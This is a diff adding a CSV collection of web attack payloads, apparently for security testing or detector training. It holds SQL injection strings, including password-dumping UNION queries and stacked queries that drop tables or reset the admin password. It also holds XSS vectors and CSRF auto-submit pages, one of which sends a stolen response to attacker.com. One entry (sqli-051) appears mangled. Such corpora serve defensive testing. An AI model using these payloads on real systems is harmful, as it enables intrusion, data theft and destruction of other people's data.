@@ -1,0 +1,461 @@
+id,attack_class,type,severity,context,payload_hash,payload
+sqli-001,SQLi,tautology,high,Login form username input,154eec809fb3,' OR '1'='1
+sqli-002,SQLi,union,high,Search input field,5a223cf8ec59,"' UNION SELECT username, password FROM users--"
+sqli-003,SQLi,blind-time,medium,ID parameter in URL,95a38465d448,'; WAITFOR DELAY '0:0:5'--
+sqli-004,SQLi,error-based,medium,User ID input,6b7595444181,"' AND 1=CONVERT(int,@@version)--"
+sqli-005,SQLi,boolean-blind,medium,Search field,9f6c1aa0cd11,' AND 1=1--
+sqli-006,SQLi,stacked-queries,critical,User input in form,86c75ed9b0e1,'; DROP TABLE users--
+sqli-007,SQLi,tautology,high,Login password field,4b44bb36a1db,' OR 1=1--
+sqli-008,SQLi,tautology,medium,URL parameter,095137e7d121,0x27 OR 0x31=0x31--
+sqli-009,SQLi,blind-time,medium,PostgreSQL ID parameter,e9d7ea913642,'; SELECT pg_sleep(5)--
+sqli-010,SQLi,error-based,medium,User input,89e8e6cff870,"' AND 1=CONVERT(int,USER())--"
+sqli-011,SQLi,boolean-blind,medium,Search input,0d6123b277df,"' AND SUBSTRING(@@version,1,1)='5'--"
+sqli-012,SQLi,tautology,high,Login username,e1702bf91751,' OR 'a'='a
+sqli-013,SQLi,tautology,high,Search field,0a7541cb14aa,' OR 1=1-- -
+sqli-014,SQLi,tautology,high,Login form,14c89135444f,'//OR//1=1--
+sqli-015,SQLi,tautology,medium,User input,af918e8d6fca,' OR CAST('a' AS INT)=CAST('a' AS INT)--
+sqli-016,SQLi,blind-time,medium,ID parameter,5bf1895c6a9d,' OR SLEEP(5)--
+sqli-017,SQLi,error-based,high,User input,969d35478dcb,"' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--"
+sqli-018,SQLi,error-based,high,User input,0f98235c482e,"' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--"
+sqli-019,SQLi,blind-time,medium,ID parameter,64ed90a385fc,'; SELECT pg_sleep(10)--
+sqli-020,SQLi,tautology,high,Login form,58286860220d,' OR 1=1#
+sqli-021,SQLi,blind-time,medium,Search input,9ba0c16f053a,' OR SLEEP(10)--
+sqli-022,SQLi,union,high,Search field,59739c99173f,"' UNION SELECT NULL, NULL, username, password FROM users--"
+sqli-023,SQLi,tautology,high,Login username,99419739cd09,' OR 1=1/*
+sqli-024,SQLi,boolean-blind,medium,Search input,91133148b21e,' AND (SELECT COUNT(*) FROM users) > 0--
+sqli-025,SQLi,blind-time,medium,ID parameter,338195803dcd,' OR pg_sleep(7)--
+sqli-026,SQLi,union,high,Search input,e3f8372ba766,"' UNION SELECT database(), NULL--"
+sqli-027,SQLi,blind-time,medium,User ID input,7db5a21350c5,'; WAITFOR DELAY '0:0:10'--
+sqli-028,SQLi,tautology,medium,Login form,e9b6195b56b6,' OR CAST(1 AS INT)=1--
+sqli-029,SQLi,boolean-blind,medium,Search input,2183b013018a,"' OR SUBSTRING(user(),1,1)='r'--"
+sqli-030,SQLi,blind-time,medium,User input,a1b644436a33,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--
+sqli-031,SQLi,union,high,Search input,7621fe52e869,"' UNION SELECT table_name, NULL FROM information_schema.tables--"
+sqli-032,SQLi,blind-time,medium,ID parameter,4c3bf91b7149,' OR (SELECT sleep(5))--
+sqli-033,SQLi,tautology,medium,Login username,7359e77635a6,' OR 0x61646d696e=0x61646d696e--
+sqli-034,SQLi,blind-time,medium,Search input,75e1e513c95f,' OR SLEEP(5)#
+sqli-035,SQLi,union,high,Search input,5e44e42c0301,"' UNION SELECT user(), NULL--"
+sqli-036,SQLi,blind-time,medium,ID parameter,6a73908491a5,' OR pg_sleep(3)--
+sqli-037,SQLi,blind-time,medium,User ID input,3772a6acdd09,'; WAITFOR DELAY '0:0:3'--
+sqli-038,SQLi,boolean-blind,medium,Search input,c299b265a9fa,"' OR SUBSTRING(@@version,1,1)='5'--"
+sqli-039,SQLi,blind-time,medium,User input,e69a747f6252,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--
+sqli-040,SQLi,stacked-queries,critical,User input,bcbe9ad53e71,"'; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--"
+sqli-041,SQLi,blind-time,medium,Search input,f45cc1448d90,' OR SLEEP(8)/*
+sqli-043,SQLi,boolean-blind,medium,Login input,e3a21306714e,"' OR SUBSTRING(user(),1,1)='a'/*"
+sqli-044,SQLi,stacked-queries,critical,User input,b9b203237ee9,'; UPDATE users SET password='hacked' WHERE username='admin'--
+sqli-045,SQLi,blind-time,medium,ID parameter,826442a651a3,' OR pg_sleep(6)/*
+sqli-046,SQLi,union,high,Search input,43562808d09a,"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--"
+sqli-047,SQLi,tautology,medium,Login form,c080665a20bf,' OR CAST('1' AS INT)=1--
+sqli-048,SQLi,blind-time,medium,User ID input,22b60dd99e75,'; WAITFOR DELAY '0:0:7'/*
+sqli-049,SQLi,boolean-blind,medium,Search input,17245738ef77,"' OR SUBSTRING(@@version,1,1)='8'#"
+sqli-051,SQLi,blind-time,medium,User input,add6b696e76e,' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/
+sqli-052,SQLi,stacked-queries,critical,User input,31e08d6ad10c,'; DELETE FROM users WHERE username='guest'--
+sqli-053,SQLi,tautology,medium,Login username,077be1698990,' OR 0x31=0x31--
+sqli-054,SQLi,blind-time,medium,Search input,171c386f2f0b,' OR SLEEP(9)#
+sqli-055,SQLi,union,high,Search input,a9a4dd98eaa6,"' UNION SELECT schema_name, NULL FROM information_schema.schemata--"
+sqli-056,SQLi,blind-time,medium,ID parameter,d4dd7331be31,' OR pg_sleep(4)#
+sqli-057,SQLi,tautology,medium,Login form,9cd2eaa7a1f3,' OR CAST(1 AS INT)=1/*
+sqli-058,SQLi,boolean-blind,medium,Search input,c4c6dada2c1e,"' OR SUBSTRING(user(),1,1)='b'/*"
+sqli-060,SQLi,stacked-queries,critical,User input,01cf98e93780,"'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--"
+sqli-061,SQLi,blind-time,medium,User ID input,60e88e716850,'; WAITFOR DELAY '0:0:5'#
+sqli-062,SQLi,boolean-blind,medium,Search input,a89a2871a8c4,"' OR SUBSTRING(@@version,1,1)='9'#"
+sqli-064,SQLi,blind-time,medium,User input,01c147038c7f,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#
+sqli-065,SQLi,stacked-queries,critical,User input,ea837cbd618e,'; DROP TABLE sessions--
+sqli-066,SQLi,tautology,medium,Login username,d77c3dc9ae99,' OR 0x41=0x41--
+sqli-067,SQLi,blind-time,medium,Search input,e64b3021284c,' OR SLEEP(11)--
+sqli-069,SQLi,blind-time,medium,ID parameter,9a1bd9f382b0,' OR pg_sleep(12)--
+sqli-070,SQLi,stacked-queries,critical,User input,efc270cbc596,'; UPDATE users SET password='newpass' WHERE username='admin'--
+sqli-071,SQLi,blind-time,medium,Search input,01c0a614fa49,' OR SLEEP(12)--
+sqli-072,SQLi,union,high,Search input,3538343fb033,"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--"
+sqli-073,SQLi,boolean-blind,medium,Login input,fceb7421ac10,"' OR SUBSTRING(user(),1,1)='c'--"
+sqli-074,SQLi,stacked-queries,critical,User input,d2dadb2bceb9,"'; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--"
+sqli-075,SQLi,blind-time,medium,ID parameter,0da72eba179d,' OR pg_sleep(8)--
+sqli-076,SQLi,union,high,Search input,a46b83122f1c,"' UNION SELECT @@version, NULL--"
+sqli-078,SQLi,blind-time,medium,User ID input,6c17d48159f4,'; WAITFOR DELAY '0:0:8'--
+sqli-079,SQLi,boolean-blind,medium,Search input,e53eebf930d1,"' OR SUBSTRING(@@version,1,1)='7'--"
+sqli-081,SQLi,blind-time,medium,User input,53ac2eb71e68,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--
+sqli-082,SQLi,stacked-queries,critical,User input,793cc4fd6418,'; DELETE FROM users WHERE username='admin'--
+sqli-083,SQLi,tautology,medium,Login username,357f103f32eb,' OR 0x42=0x42--
+sqli-084,SQLi,blind-time,medium,Search input,7db046800de0,' OR SLEEP(13)--
+sqli-086,SQLi,blind-time,medium,ID parameter,947d6a7bf9f7,' OR pg_sleep(14)--
+sqli-088,SQLi,boolean-blind,medium,Search input,c8ea7a7d88f8,"' OR SUBSTRING(user(),1,1)='d'--"
+sqli-090,SQLi,stacked-queries,critical,User input,dc0d0e7ca49a,"'; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--"
+sqli-091,SQLi,blind-time,medium,User ID input,d2cbeca39279,'; WAITFOR DELAY '0:0:9'--
+sqli-092,SQLi,boolean-blind,medium,Search input,57b9cd711d86,"' OR SUBSTRING(@@version,1,1)='6'--"
+sqli-094,SQLi,blind-time,medium,User input,470fefa04c05,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--
+sqli-096,SQLi,tautology,medium,Login username,e74a0969511a,' OR 0x43=0x43--
+sqli-097,SQLi,blind-time,medium,Search input,b1faf0fe529d,' OR SLEEP(14)--
+sqli-099,SQLi,blind-time,medium,ID parameter,efea1371e429,' OR pg_sleep(15)--
+sqli-100,SQLi,stacked-queries,critical,User input,a9f38e932075,'; UPDATE users SET password='securepass' WHERE username='admin'--
+xss-001,XSS,reflected,high,URL parameter,1b4978d617f5,<script>alert('XSS1')</script>
+xss-002,XSS,reflected,high,URL parameter,78abecf0a736,<img src=x onerror=alert('XSS2')>
+xss-003,XSS,stored,high,Comment input,ba65bff15667,<script>alert('XSS3')</script>
+xss-004,XSS,reflected,high,URL parameter,ed8e7ea05207,"<a href='javascript:alert(""XSS4"")'>click</a>"
+xss-005,XSS,reflected,high,URL parameter,99c3fbbe07bb,<input autofocus onfocus=alert('XSS5')>
+xss-006,XSS,stored,high,User profile bio,bab8e85a5967,"<iframe src='javascript:alert(""XSS6"")'></iframe>"
+xss-007,XSS,reflected,high,URL parameter,5755f13cd141,<svg onload=alert('XSS7')>
+xss-008,XSS,reflected,high,URL parameter,82b698be77b5,<body onload=alert('XSS8')>
+xss-009,XSS,stored,high,User input field,1b7c1bea0720,<div onclick=alert('XSS9')>Click me</div>
+xss-010,XSS,reflected,high,URL parameter,5192d21f6c4e,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS10"")'>"
+xss-011,XSS,reflected,high,URL parameter,05c97df6ba07,"<style>body{background:url(""javascript:alert('XSS11')"")}</style>"
+xss-012,XSS,reflected,high,URL parameter,459dc0a8cb89,%3Cscript%3Ealert('XSS12')%3C/script%3E
+xss-013,XSS,stored,high,User input field,b66661b86b28,<span onmouseover=alert('XSS13')>Hover me</span>
+xss-014,XSS,reflected,high,URL parameter,da2c70c5e510,"<iframe srcdoc=""<script>alert('XSS14')</script>""></iframe>"
+xss-015,XSS,reflected,high,URL parameter,0f2965fb50a4,"<object data='javascript:alert(""XSS15"")'></object>"
+xss-016,XSS,stored,high,User input field,113855d37fc4,<form onsubmit=alert('XSS16')><input type='submit'></form>
+xss-017,XSS,reflected,high,URL parameter,7e04cfc6f1e7,<video src=x onerror=alert('XSS17')></video>
+xss-018,XSS,reflected,high,URL parameter,57d409b21444,<audio src=x onerror=alert('XSS18')></audio>
+xss-019,XSS,stored,high,User input field,ca38aa288fce,<textarea onfocus=alert('XSS19')>Focus me</textarea>
+xss-020,XSS,reflected,high,URL parameter,0b92187665b3,"<math href='javascript:alert(""XSS20"")'>X</math>"
+xss-021,XSS,reflected,high,URL parameter,0ff481084eaa,"<base href=""javascript:alert('XSS21');//"">"
+xss-022,XSS,stored,high,User input field,d0472896e256,"<a href='#' onclick='alert(""XSS22"")'>Click me</a>"
+xss-023,XSS,reflected,high,URL parameter,f26fb92aa405,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS23"")'>"
+xss-024,XSS,stored,high,User input field,872e4ff7b577,"<button onclick='alert(""XSS24"")'>Click</button>"
+xss-025,XSS,reflected,high,URL parameter,4911dd824d42,<form onreset=alert('XSS25')><input type='reset'></form>
+xss-026,XSS,stored,high,User input field,11a90254bb71,<marquee onstart=alert('XSS26')>Scrolling text</marquee>
+xss-027,XSS,reflected,high,URL parameter,ce92ef0e5810,"<embed src='javascript:alert(""XSS27"")'>"
+xss-028,XSS,stored,high,User input field,8246932eb788,"<bgsound src='javascript:alert(""XSS28"")'>"
+xss-029,XSS,reflected,high,URL parameter,24a1cc7010e7,<xml onload=alert('XSS29')>
+xss-030,XSS,stored,high,User input field,72ffaf1ded30,"<iframe src='about:blank' onload='alert(""XSS30"")'></iframe>"
+xss-031,XSS,reflected,high,URL parameter,8b3e48691abb,<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>
+xss-032,XSS,stored,high,User profile input,4bac8a03df5d,"<base href=""javascript:alert('XSS32');//"">"
+xss-033,XSS,reflected,high,URL parameter,58d9dd39b3ea,<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>
+xss-034,XSS,stored,high,User input field,1a26e9dbb8b8,"<div onpointerover='alert(""XSS34"")'>Hover me</div>"
+xss-035,XSS,reflected,high,URL parameter,29a4ba1ebf02,<script>alert(XSS35)</script>
+xss-036,XSS,stored,high,User input field,52375d4e2983,<svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>
+xss-037,XSS,reflected,high,URL parameter,fdc751b68e3f,"<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>"
+xss-038,XSS,stored,high,User input field,891c532302a9,"<input oninput='alert(""XSS38"")'>"
+xss-039,XSS,reflected,high,URL parameter,ab94684d417a,<script>eval(alert('XSS39'))</script>
+xss-040,XSS,stored,high,User input field,1fe856872d68,"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>"
+xss-041,XSS,reflected,high,URL parameter,ce5e1e1f70c0,"<span onpointerdown='alert(""XSS41"")'>Click me</span>"
+xss-042,XSS,stored,high,User input field,4e5add648409,"<math href='javascript:alert(""XSS42"")'>X</math>"
+xss-043,XSS,reflected,high,URL parameter,cfbb2dc10b73,"<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>"
+xss-044,XSS,stored,high,User input field,e76bd9163fa8,"<video oncanplay='alert(""XSS44"")'></video>"
+xss-045,XSS,reflected,high,URL parameter,851c4af192f7,"<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>"
+xss-046,XSS,stored,high,User input field,362f11fc3402,"<svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>"
+xss-047,XSS,reflected,high,URL parameter,33e160eeb11b,"<script>setTimeout('alert(""XSS47"")',0)</script>"
+xss-048,XSS,stored,high,User input field,2557bf980db5,"<details ontoggle='alert(""XSS48"")'><summary>Click me</summary></details>"
+xss-049,XSS,reflected,high,URL parameter,40b8877b4516,"<input formaction='javascript:alert(""XSS49"")' type='submit'>"
+xss-050,XSS,stored,high,User input field,c7f79b7757fc,"<svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>"
+xss-051,XSS,reflected,high,URL parameter,bc26074b80cd,"<script>setInterval(function(){alert('XSS51')},1000)</script>"
+xss-052,XSS,stored,high,User input field,36a82ab6c0e3,"<iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>"
+xss-053,XSS,reflected,high,URL parameter,15db1dd5e91a,"<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>"
+xss-054,XSS,stored,high,User input field,bf6ef12cba93,"<iframe src='javascript:alert(""XSS54"")'></iframe>"
+xss-055,XSS,reflected,high,URL parameter,8b7147d4fc93,"<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>"
+xss-056,XSS,stored,high,User input field,9ba7008877de,"<svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>"
+xss-057,XSS,reflected,high,URL parameter,08c7a03b5458,"<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>"
+xss-058,XSS,stored,high,User input field,7508c7281399,"<svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>"
+xss-059,XSS,reflected,high,URL parameter,e863e8d5a936,"<script>Function('alert(""XSS59"")')()</script>"
+xss-060,XSS,stored,high,User input field,cce69b1e3fed,"<iframe onload='alert(""XSS60"")' srcdoc='%3Cscript%3Ealert(%22XSS60%22)%3C/script%3E'></iframe>"
+xss-061,XSS,reflected,high,URL parameter,83fafb627b95,<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>
+xss-062,XSS,stored,high,User input field,04132a0b3261,"<details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>"
+xss-063,XSS,reflected,high,URL parameter,7c2adfc93969,"<math href='javascript:alert(""XSS63"")'>X</math>"
+xss-064,XSS,stored,high,User input field,fd0ef3eeaea8,"<audio src='x' onerror='alert(""XSS64"")'></audio>"
+xss-065,XSS,reflected,high,URL parameter,492945f5bd0d,"<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>"
+xss-066,XSS,stored,high,User input field,021e3be86014,"<svg><animateMotion onbegin='alert(""XSS66"")' dur='1s' repeatCount='1'/></svg>"
+xss-067,XSS,reflected,high,URL parameter,4a365c109941,"<input oninvalid='alert(""XSS67"")' required>"
+xss-068,XSS,stored,high,User input field,386f1db5b067,"<iframe allow='scripts' srcdoc='<script>alert(""XSS68"")</script>'></iframe>"
+xss-069,XSS,reflected,high,URL parameter,476523cd89ca,"<svg tabindex='1' onfocusin='alert(""XSS69"")'></svg>"
+xss-070,XSS,stored,high,User input field,6d8f20967cf6,"<video onpause='alert(""XSS70"")'></video>"
+xss-071,XSS,reflected,high,URL parameter,b8d1f64c2ae1,"<svg onmouseenter='alert(""XSS71"")'></svg>"
+xss-072,XSS,stored,high,User input field,c030ca856118,"<form oninput='alert(""XSS72"")'><input></form>"
+xss-073,XSS,reflected,high,URL parameter,2ab53cb12a29,"<svg onwheel='alert(""XSS73"")'></svg>"
+xss-074,XSS,stored,high,User input field,ba50a8f0cd71,"<iframe allowfullscreen onload='alert(""XSS74"")'></iframe>"
+xss-075,XSS,reflected,high,URL parameter,5a97ec0e3903,"<svg onanimationend='alert(""XSS75"")'></svg>"
+xss-076,XSS,stored,high,User input field,e935976b7a7d,"<audio onplay='alert(""XSS76"")'></audio>"
+xss-077,XSS,reflected,high,URL parameter,c8fd27852076,"<svg onscroll='alert(""XSS77"")' style='overflow:auto;height:10px;'></svg>"
+xss-078,XSS,stored,high,User input field,d9a11d8c188b,"<iframe seamless onload='alert(""XSS78"")'></iframe>"
+xss-079,XSS,reflected,high,URL parameter,06e040ad1415,"<svg oncut='alert(""XSS79"")'></svg>"
+xss-080,XSS,stored,high,User input field,ca200f8ca384,"<svg oncopy='alert(""XSS80"")'></svg>"
+xss-081,XSS,reflected,high,URL parameter,fd22eaff922e,"<svg onpaste='alert(""XSS81"")'></svg>"
+xss-082,XSS,stored,high,User input field,2ec5c9a653b0,"<svg onreset='alert(""XSS82"")'></svg>"
+xss-083,XSS,reflected,high,URL parameter,097f94a8796e,"<svg onsearch='alert(""XSS83"")'></svg>"
+xss-084,XSS,stored,high,User input field,0d798c7acfba,"<svg onselect='alert(""XSS84"")'></svg>"
+xss-085,XSS,reflected,high,URL parameter,cb535c3669f4,"<svg onshow='alert(""XSS85"")'></svg>"
+xss-086,XSS,stored,high,User input field,83abcb8a6517,"<svg ontoggle='alert(""XSS86"")'></svg>"
+xss-087,XSS,reflected,high,URL parameter,310d2ee7406e,"<svg ontransitionend='alert(""XSS87"")'></svg>"
+xss-088,XSS,stored,high,User input field,0568c4e90d56,"<svg onunload='alert(""XSS88"")'></svg>"
+xss-089,XSS,reflected,high,URL parameter,1924fa4dc3a1,"<svg onvolumechange='alert(""XSS89"")'></svg>"
+xss-090,XSS,stored,high,User input field,318c67389ace,"<svg onwaiting='alert(""XSS90"")'></svg>"
+xss-091,XSS,reflected,high,URL parameter,457c1d546aef,"<svg onwheel='alert(""XSS91"")' style='animation:spin 1s linear infinite'></svg>"
+xss-092,XSS,stored,high,User input field,d6b195fb00bc,"<svg onpointercancel='alert(""XSS92"")'></svg>"
+xss-093,XSS,reflected,high,URL parameter,1d0cd75bac24,"<svg onpointerout='alert(""XSS93"")'></svg>"
+xss-094,XSS,stored,high,User input field,fc01335c0868,"<svg onpointerover='alert(""XSS94"")'></svg>"
+xss-095,XSS,reflected,high,URL parameter,0ff67572e0dd,"<svg onpointerup='alert(""XSS95"")'></svg>"
+xss-096,XSS,stored,high,User input field,700786cfd413,"<svg onselectstart='alert(""XSS96"")'></svg>"
+xss-097,XSS,reflected,high,URL parameter,46d5ea12d0ef,"<svg tabindex='0' onshow='alert(""XSS97"")'></svg>"
+xss-098,XSS,stored,high,User input field,51571d70e08b,"<svg onstalled='alert(""XSS98"")'></svg>"
+xss-099,XSS,reflected,high,URL parameter,a65e01594cf2,"<svg onsubmit='alert(""XSS99"")'></svg>"
+xss-100,XSS,stored,high,User input field,2336638f6e3c,"<svg onunload='alert(""XSS100"")'><script>alert('XSS100')</script></svg>"
+csrf-001,CSRF,CSRF,high,Malicious webpage,ff2cc194f7cb,<form action='https://target.com/change-password' method='POST' id='csrfForm'><input type='hidden' name='password' value='hacked123'/></form><script>document.getElementById('csrfForm').submit();</script>
+csrf-002,CSRF,CSRF,medium,Malicious webpage,6c687d4f4d8e,<img src='https://target.com/delete-account?confirm=yes' style='display:none'/>
+csrf-003,CSRF,CSRF,high,Malicious webpage,7e3061f36552,"<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/transfer',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('amount=1000&to=attacker');</script>"
+csrf-004,CSRF,CSRF,high,Malicious webpage,7587f0801424,"<script>fetch('https://target.com/update-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@example.com'});</script>"
+csrf-005,CSRF,CSRF,medium,Malicious webpage,a91e76494ba6,<form action='https://target.com/upload-avatar' method='POST' enctype='multipart/form-data' id='csrfForm'><input type='file' name='avatar' value='malicious.jpg'/></form><script>document.getElementById('csrfForm').submit();</script>
+csrf-006,CSRF,CSRF,medium,Malicious webpage,1ee00cf67dcb,<meta http-equiv='refresh' content='0;url=https://target.com/subscribe?plan=premium'/>
+csrf-007,CSRF,CSRF,high,Malicious webpage,1fc35eb3392f,<script src='https://attacker.com/csrf-trigger.js'></script>
+csrf-008,CSRF,CSRF,high,Malicious webpage,37d767acccaa,"<iframe style='display:none' srcdoc=""<form action='https://target.com/settings' method='POST' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>""></iframe>"
+csrf-009,CSRF,CSRF,high,Malicious webpage,e1c0395d88a9,<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>
+csrf-010,CSRF,CSRF,medium,Malicious webpage,5c46282a1f28,"<script>navigator.sendBeacon('https://target.com/track', 'data=malicious');</script>"
+csrf-011,CSRF,CSRF,high,Malicious webpage,c39f13593e27,"<form action='https://target.com/update' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>"
+csrf-012,CSRF,CSRF,high,Malicious webpage,d809ad34500c,"<img src='invalid.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/like',true);xhr.withCredentials=true;xhr.send('post=123');"">"
+csrf-013,CSRF,CSRF,high,Malicious webpage,c926fb983e67,<form action='https://target.com/transfer' method='POST' id='f'><input type='hidden' name='amount' value='1000'/><input type='hidden' name='to' value='attacker'/></form><script>document.getElementById('f').submit();</script>
+csrf-014,CSRF,CSRF,high,Malicious webpage,5a059c60e8ab,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'value=1'});</script>"
+csrf-015,CSRF,CSRF,medium,Malicious webpage,70585676a5c1,<form action='https://target.com/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>
+csrf-016,CSRF,CSRF,high,Malicious webpage,8d81a79ee7e2,"<script>setTimeout(function(){fetch('https://target.com/api/delete',{method:'POST',credentials:'include'});},1000);</script>"
+csrf-017,CSRF,CSRF,high,Malicious webpage,0907082dc674,<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/settings' method='POST' target='hiddenFrame' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>
+csrf-018,CSRF,CSRF,medium,Malicious webpage,2a6fd49b2b4c,<form action='https://target.com/add-friend' method='GET' id='f'><input name='user' value='attacker'/></form><script>document.getElementById('f').submit();</script>
+csrf-019,CSRF,CSRF,high,Malicious webpage,77a2d13fed16,<form id='f' action='https://target.com/subscribe' method='POST'><input name='plan' value='premium'/></form><script>document.getElementById('f').submit();</script>
+csrf-020,CSRF,CSRF,medium,Malicious webpage,4f4b2e0acba6,"<script>navigator.sendBeacon('https://target.com/api/track', 'action=subscribe');</script>"
+csrf-021,CSRF,CSRF,high,Malicious webpage,ee8b0e8aa8e4,"<iframe style='display:none' id='f'></iframe><form action='https://target.com/api/transfer' method='POST' target='f' id='form'><input name='amount' value='9999'/><input name='to' value='attacker'/></form><script>setTimeout(()=>document.getElementById('form').submit(),2000);</script>"
+csrf-022,CSRF,CSRF,critical,Malicious webpage,b4a3cb7aaf70,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',body:'setting=evil'}).then(r=>r.text()).then(t=>fetch('https://attacker.com/log?data='+encodeURIComponent(t)));</script>"
+csrf-023,CSRF,CSRF,high,Malicious webpage,c9c5e7a165d1,<form action='https://target.com/api/settings' method='POST' id='f'><input type='hidden' name='mode' value='stealth'/><input type='hidden' name='level' value='admin'/></form><script>document.getElementById('f').submit();</script>
+csrf-024,CSRF,CSRF,high,Malicious webpage,00c76245ee0e,"<img src='https://target.com/api/trigger' onload=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/confirm',true);xhr.withCredentials=true;xhr.send('confirm=yes');"">"
+csrf-026,CSRF,CSRF,medium,Malicious webpage,9bff94b7b388,"<script>navigator.sendBeacon('https://target.com/api/track','action=steal');</script>"
+csrf-027,CSRF,CSRF,medium,Malicious webpage,a01ffc9e0cb3,<form action='https://target.com/api/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>
+csrf-028,CSRF,CSRF,high,Malicious webpage,9214122703a4,"<iframe style='display:none' srcdoc=""<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>""></iframe>"
+csrf-029,CSRF,CSRF,high,Malicious webpage,335278d40f21,"<script>setTimeout(()=>fetch('https://target.com/api/step1',{method:'POST',credentials:'include'}),1000);setTimeout(()=>fetch('https://target.com/api/step2',{method:'POST',credentials:'include'}),3000);</script>"
+csrf-030,CSRF,CSRF,high,Malicious webpage,6ce8562d3c80,<iframe name='hidden' style='display:none'></iframe><form action='https://target.com/api/settings' method='POST' target='hidden' id='f'><input name='mode' value='stealth'/></form><script>document.getElementById('f').submit();</script>
+csrf-031,CSRF,CSRF,high,Malicious webpage,b5a582fcf8c7,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'data=evil'});</script>"
+csrf-032,CSRF,CSRF,high,Malicious webpage,997d0b34072f,"<form action='https://target.com/api/submit' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>"
+csrf-033,CSRF,CSRF,high,Malicious webpage,d61f67a45e2f,"<img src='invalid.jpg' onerror=""fetch('https://target.com/api/like',{method:'POST',credentials:'include',body:'post=123'});"">"
+csrf-034,CSRF,CSRF,medium,Malicious webpage,e0494faa21fc,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=premium'/>
+csrf-035,CSRF,CSRF,critical,Malicious webpage,14d73f0357ea,<script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script>
+csrf-036,CSRF,CSRF,high,Malicious webpage,c55f504baf02,"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete'})});</script>"
+csrf-037,CSRF,CSRF,high,Malicious webpage,cfade78088eb,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2000);</script>"
+csrf-040,CSRF,CSRF,high,Malicious webpage,880402431d89,"<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/api/hidden' method='POST' target='hiddenFrame' id='f'><input name='secret' value='data'/></form><script>setTimeout(()=>document.getElementById('f').submit(),1500);</script>"
